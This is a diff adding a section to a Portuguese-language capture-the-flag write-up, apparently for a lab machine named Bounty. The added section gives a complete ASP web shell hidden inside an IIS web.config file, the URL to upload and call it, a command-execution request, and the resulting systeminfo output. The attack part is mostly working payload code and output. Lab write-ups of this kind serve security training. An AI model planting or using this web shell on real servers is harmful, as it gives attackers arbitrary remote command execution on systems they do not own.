@@ -2600,7 +2600,131 @@ Fui entao pesquisar mais sobre ele e sua relacao com o IIS 7.5
 Comecei entao a explorar e rapidamente ja tinha uma webshell
 
 
+***resources***
+
+https://gist.githubusercontent.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c/raw/8173f5041c9a69cc58e980717ebe044f8eff9e9f/shell%2520command%2520web.config
+
+https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c
+
+https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
+
+
+webshell  
+
+web.config
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!--
+<% Response.write("-"&"->")%>
+<%
+Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+
+Function getCommandOutput(theCommand)
+    Dim objShell, objCmdExec
+    Set objShell = CreateObject("WScript.Shell")
+    Set objCmdExec = objshell.exec(thecommand)
+
+    getCommandOutput = objCmdExec.StdOut.ReadAll
+end Function
+%>
+
+<BODY>
+<FORM action="" method="GET">
+<input type="text" name="cmd" size=45 value="<%= szCMD %>">
+<input type="submit" value="Run">
+</FORM>
+
+<PRE>
+<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+<%Response.Write(Request.ServerVariables("server_name"))%>
+<p>
+<b>The server's port:</b>
+<%Response.Write(Request.ServerVariables("server_port"))%>
+</p>
+<p>
+<b>The server's software:</b>
+<%Response.Write(Request.ServerVariables("server_software"))%>
+</p>
+<p>
+<b>The server's software:</b>
+<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
+<% szCMD = request("cmd")
+thisDir = getCommandOutput("cmd /c" & szCMD)
+Response.Write(thisDir)%>
+</p>
+<br>
+</BODY>
 
 
 
+<%Response.write("<!-"&"-") %>
+-->
+```
+
+faz o upload e em seguida acesse o mesmo em `http://10.10.10.93/uploadedfiles/web.config`
+
+`http://10.10.10.93/uploadedfiles/web.config?cmd=systeminfo`
+
+```
+The server's software:
+10.10.10.93
+Host Name:                 BOUNTY
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                55041-402-3606965-84760
+Original Install Date:     5/30/2018, 12:22:24 AM
+System Boot Time:          7/2/2020, 1:48:55 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,626 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,653 MB
+Virtual Memory: In Use:    442 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.93
+```
 
